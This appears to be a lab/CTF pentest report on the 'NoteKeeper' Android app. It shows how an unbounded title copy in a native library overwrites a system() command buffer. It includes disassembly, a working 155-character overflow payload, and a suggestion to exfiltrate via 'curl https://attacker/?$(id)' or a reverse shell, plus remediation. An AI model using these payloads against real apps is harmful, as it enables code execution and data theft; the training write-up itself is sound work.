# Mobile App Pentest — `com.mobilehackinglab.notekeeper` ("NoteKeeper")

**Target:** `com.mobilehackinglab.notekeeper.apk` — Mobile Hacking Lab "NoteKeeper" challenge
**Platform:** Android (minSdk 27, targetSdk 34); native `libnotekeeper.so` (arm64-v8a, NDK r25b, stripped)
**Basis:** CTF / lab / training
**Date:** 2026-11-02
**Verification:** Identified by static analysis — jadx for the Kotlin shell, and capstone
disassembly of the native `parse` export (objdump here lacks aarch64). The overflow offset
(100 bytes) and the `system()` sink were derived directly from the disassembly; PoC title provided.
On-device run pending.

---

## Summary

The Kotlin side of NoteKeeper is inert — notes are held in an in-memory `ArrayList`, there is no
storage, no deep link, no WebView, and the single `MainActivity` is exported only with
`MAIN`/`LAUNCHER` (not externally invokable with data). All the logic that matters is in the native
library loaded at startup (`System.loadLibrary("notekeeper")`), reached through one JNI method:

```kotlin
public final native String parse(String Title)   // called on every "add note" with the title
```

`Java_…_MainActivity_parse` contains a **stack buffer overflow that overwrites the argument of a
`system()` call**, so a sufficiently long note **title** achieves **arbitrary OS command execution**
in the app's process.

Reconstructed from the disassembly of `parse` (`libnotekeeper.so`, arm64-v8a):

```c
// pseudocode
void parse(JNIEnv* env, jobject thiz, jstring Title) {
    char cmd[...];                 // buffer at sp+0x70  (the system() argument)
    char title_buf[100];           // buffer at sp+0x0c  (adjacent, 0x70-0x0c = 100 bytes below cmd)

    const jchar* src = env->GetStringChars(Title, 0);
    int len          = env->GetStringLength(Title);          // attacker-controlled, UNBOUNDED

    memcpy(cmd, "Log \"Note added at $(date)\"", 500);       // preload the command buffer

    title_buf[0] = toupper((char)src[0]);                    // capitalize first letter
    for (int i = 1; i < len; i++)                            // NO bounds check vs sizeof(title_buf)
        title_buf[i] = (char)src[i];                         // UTF-16 truncated to byte
    title_buf[len] = '\0';

    system(cmd);                                             // runs whatever now sits at sp+0x70
    return env->NewStringUTF(title_buf);
}
```

Because `title_buf` (sp+0x0c) sits exactly **100 bytes** below `cmd` (sp+0x70) and the copy loop is
bounded only by the attacker-supplied `len`, title bytes beyond index 100 spill into `cmd` — i.e.
they **become the string passed to `system()`**. The copy's terminating `'\0'` then cleanly ends the
attacker command. There is no stack canary, and `system()` executes mid-function (before the
epilogue), so the overflow fires the moment a note is added.

| ID | Finding | Severity | MASVS |
|----|---------|----------|-------|
| NK-01 | Native stack buffer overflow in `parse` — unbounded title copy into a 100-byte stack buffer overwrites the adjacent `system()` command buffer → arbitrary OS command execution | **Critical** | MASVS-CODE-4 / MASVS-CODE-2 |
| NK-02 | Dangerous design: user input processed by `system()` at all; fixed command already uses `$(date)` command substitution (shell invoked) | High | MASVS-CODE-4 |
| NK-03 | Native library built without a stack canary (`__stack_chk_guard` absent) — no mitigation between the overflow and the sink | Medium | MASVS-RESILIENCE-2 |
| NK-04 | `android:debuggable="true"` in shipped APK | Medium | MASVS-RESILIENCE-1 |
| NK-05 | `android:allowBackup="true"` | Medium | MASVS-STORAGE-2 |

---

## NK-01 — The overflow (offsets from the disassembly)

Key instructions in `Java_…_parse` (addresses are file/vaddr in `libnotekeeper.so`):
```
a94: bl GetStringChars         ; src  = env->GetStringChars(Title, 0)   -> [x29-0x28]
aa4: bl GetStringLength        ; len  = env->GetStringLength(Title)     -> [x29-0x2c]
aac: add x0, sp, #0x70         ; dst  = cmd buffer (sp+0x70)
ab0: adrp/add x1, #0x648       ; src  = "Log \"Note added at $(date)\""
ab8: mov x2, #0x1f4            ; n    = 500
abc: bl memcpy                 ; memcpy(cmd, "Log ...$(date)", 500)
ae4: strb w0, [sp, #0xc]       ; title_buf[0] = toupper(src[0])         (title buffer = sp+0x0c)
...  loop i=1..len:            ; NO bound check
b14: ldrh w8, [x8]             ;   ch = src[i]      (UTF-16)
b24: strb w8, [sp+0xc + i]     ;   title_buf[i] = (byte)ch
b40: bl __stack? no -> (toupper helper at 0xbf4)
b3c: add x0, sp, #0x70         ;
b40: bl system                 ; system(cmd)   <-- sink
b54: strb wzr, [sp+0xc + len]  ; title_buf[len] = 0   (terminates the injected command)
b5c: bl NewStringUTF           ; return capitalized title
```
`0x70 − 0x0c = 0x64 = 100`, so `title[100:]` overwrites `cmd`.

### PoC
In the app, tap **+** to add a note and set the **Title** to 100 filler bytes followed by the command
(the note body can be anything). The command runs as the NoteKeeper process; since the app has no
storage permission (only `INTERNET`), write proof into its own data dir and read it back with
`run-as` (`debuggable=true`):

**Title (155 chars):**
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAid>/data/data/com.mobilehackinglab.notekeeper/files/pwn
```
(= `"A"×100` + `id>/data/data/com.mobilehackinglab.notekeeper/files/pwn`)

Adding the note triggers `parse` → `system("id>/data/data/.../files/pwn")`. Verify:
```bash
adb shell "run-as com.mobilehackinglab.notekeeper cat files/pwn"
```
A `uid=…(u0_aNNN) … com.mobilehackinglab.notekeeper …` line proves code execution in the app's
process. (The fixed command uses `$(date)`, confirming `system()` runs via a shell, so `;`, `|`,
`$()`, redirects in the injected portion all work.) To capture output off-device, use the `INTERNET`
permission (e.g. append `;curl https://attacker/?$(id)` or a reverse shell) instead of a file.

---

## NK-03 / NK-04 / NK-05 — Supporting weaknesses
- **No stack canary** in `libnotekeeper.so` (no `__stack_chk_guard`/`__stack_chk_fail`), so nothing
  detects the overwrite before `system()` runs; the same overflow can also reach the saved `x30`.
- **`debuggable="true"`** → `run-as`/debugger access (also how the PoC reads the proof file).
- **`allowBackup="true"`** → `adb backup` can pull app-private data.

---

## Root cause & remediation
- **Bound the copy.** Copy at most `sizeof(title_buf)-1` bytes; use a length-checked API and reject or
  truncate oversized input. The loop must compare `i` against the destination size, not just `len`.
- **Never pass data to `system()`.** There is no reason a note-keeper should shell out; remove the
  `system()` call entirely. If a subprocess is unavoidable, use `exec*` with a fixed argv and no
  shell, and keep untrusted data out of the command.
- **Rebuild with mitigations** — `-fstack-protector-strong` (stack canaries), `_FORTIFY_SOURCE`, and
  keep ASLR/PIE; these turn the overflow into a crash rather than silent command control.
- Disable `debuggable`/`allowBackup` for release builds.

---

## Appendix — environment & method
- Tools: `unzip`, `jadx` (Kotlin + manifest), `readelf`/`nm` (ELF symbols & relocations), and a small
  **capstone** script for the aarch64 disassembly of `parse` (the system `objdump` lacks aarch64).
- Native facts: `libnotekeeper.so` imports exactly `memcpy` and **`system`**; exports
  `Java_com_mobilehackinglab_notekeeper_MainActivity_parse` (0xa6c, 280 bytes); `.rodata@0x648` holds
  `Log "Note added at $(date)"`. No `.so` other than arm64-v8a was shipped.
- App classes: `MainActivity` (native `parse`, `showDialogue` add-note flow), `note_data`,
  `Note_Adapter` (RecyclerView).
